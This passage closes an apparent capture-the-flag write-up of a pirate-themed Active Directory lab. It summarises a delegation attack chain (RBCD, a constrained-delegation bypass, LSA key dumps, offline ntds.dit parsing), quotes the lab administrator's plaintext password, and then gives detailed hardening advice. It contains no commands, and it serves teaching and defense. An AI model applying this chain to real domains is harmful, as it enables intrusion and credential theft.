The multi-stage delegation chain is the technique note worth keeping. The RBCD leg on `QUEENREV` used `JOLLYROGER$`'s AES key from the LSA dump. Navigating the KCD leg's protocol-transition gap — where `QUEENREV$` couldn't mint a direct S4U2Self to `FLYINGDUTCHMAN` — was the technical peak of the exercise. By deploying the `-additional-ticket` flag, we cleanly reused the forwardable `Administrator` ticket from the RBCD leg to walk the pre-existing treaty without a new S4U2Self request. Neither key was cracked; both were pulled straight from the LSA.

The absolute highlight of the voyage, however, came in the hold of `FLYINGDUTCHMAN` upon uncovering an offline `NTDS.zip` backup and realizing we didn't even need to touch the network with a noisy DCSync. Carving the database offline with `ntdissector` and unearthing a plaintext password straight out of an account description felt like discovering buried treasure.

Each configuration, in isolation, is reasonable: a printer authenticating via NTLM, a service account with `SeImpersonatePrivilege`, a constrained delegation treaty, a backup share containing an `ntds.dit`. Stacked in the order the directory permitted, they became a single, seamless chart from a printer document to absolute domain ownership.

**Mission complete: 9 flags, 4 ships, one Domain Administrator ticket, an offline `ntds.dit` carved to JSON, and a plaintext domain admin password that should never have been written down.** The fleet surrenders the whole chart.

🏴‍☠️ Massive thanks to [mpgn](https://x.com/mpgn_x64) for crafting the BarbHack lab and to the NetExec dev team for building the incredible tool. ⚓

---

## Closing the Seams

The chain started at the config page of a web-facing printer and ended inside `ntds.dit` on the Domain Controller. The fixes aren't about patching a vulnerability — there wasn't one. They're about closing the seams between the things the domain was set up to trust, one by one, in the order the directory permitted them to be walked.

**Authentication.** Disable NTLMv1, enforce NTLMv2 minimum session security through Group Policy, and require LDAP signing and channel binding on the DC. The relay worked because `JOLLYROGER$` was coerced into authenticating to clear LDAP over the wire — signing and channel binding make that authentication unusable by the relay. On the printer side, the whole chain opened because an HP LaserJet's admin page was web-facing with a password in a disabled HTML field. A printer that's reachable from the attacker's VLAN is a printer that's reachable from the attacker. Network-segment it, require authentication that isn't visible in the page source, and don't leave an `IT_Procedures.docx` with fifty-two temp credentials on a `/scan/` share.

**Delegation.** Audit RBCD and KCD rights together, not separately. The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute on `JOLLYROGER$` should not be writable by a domain user who can authenticate to the DC's LDAP — scope the ACL so only the machine account itself, or an account with explicit delegation management rights, can write it. The constrained delegation from `QUEENREV$` to `host/FLYINGDUTCHMAN` was pre-existing and visible to `morgan` the moment `--find-delegation` ran. Every constrained delegation right that crosses a host boundary should have a documented purpose and an owner; review `msDS-AllowedToDelegateTo` for rights that no longer have a reason to exist. The protocol-transition gap that made the `-additional-ticket` bypass interesting is a property of a constrained delegation without U2U — but chaining it with an RBCD write turns it into a full delegation path, so the audit has to look at the chain, not just the individual right.

**Service accounts.** `gMSA-shipping$` held sysadmin-equivalent impersonation rights over `sa`, and `sa` had `xp_cmdshell` enabled. The gMSA should have the minimum database permissions it needs — not sysadmin, not impersonation of `sa`. Disable `xp_cmdshell` unless it's required for a documented task, and when it is required, scope it to a context that doesn't have `SeImpersonatePrivilege`. The SQL Server service account should be a local account or a gMSA with no delegation rights — not a domain account that carries more trust than the service needs. And the `msDS-ManagedPassword` blob for `gMSA-shipping$` should not have been sitting in a file called `shipping.txt` in a folder called `ISLAND2` on `QUEENREV` — that's a data-surface seam that belongs to the gMSA management process, not to a share on a host.

**Backups and directory hygiene.** A domain's identity — `ntds.dit`, `SYSTEM`, `SECURITY` — should not live on a share that a local admin on a member host can read. The backup process should write the archive to a location that isn't a network share, or if it does write to a share, that share should be restricted to the backup service account and the hosts that need to read it. `C:\BACKUP` on `FLYINGDUTCHMAN` was readable by anyone who held Domain Admin on the host — and Domain Admin on the host came from a delegation walk that started with a relay. The chain is the point; the fix has to account for it. And the `description` field on `blackbeard`'s account held `REDqC8aQtyhd78A`, which turned out to be `administrator`'s password. The description field is not a password store — it's a text attribute readable by anyone who can authenticate to the domain. Passwords should never be written into description fields, notes fields, or any other directory attribute that isn't explicitly a credential store. Audit the description attribute the way you audit the password attribute.

**Temp credentials.** The `IT_Procedures.docx` said passwords must be rotated within 24 hours. `blackbeard`'s wasn't. Rotate temp passwords on schedule, don't let the same password string live in two places at once — especially when one of those places is a directory attribute and the other is a hash in the NTDS database — and remember that a document reachable from a printer's web server is a document reachable from the attacker's VLAN.

The domain in this lab didn't fail because of a single catastrophic misconfiguration. It failed because each of these surfaces had a seam, and the seams lined up. Close them one at a time, in the order they were walked.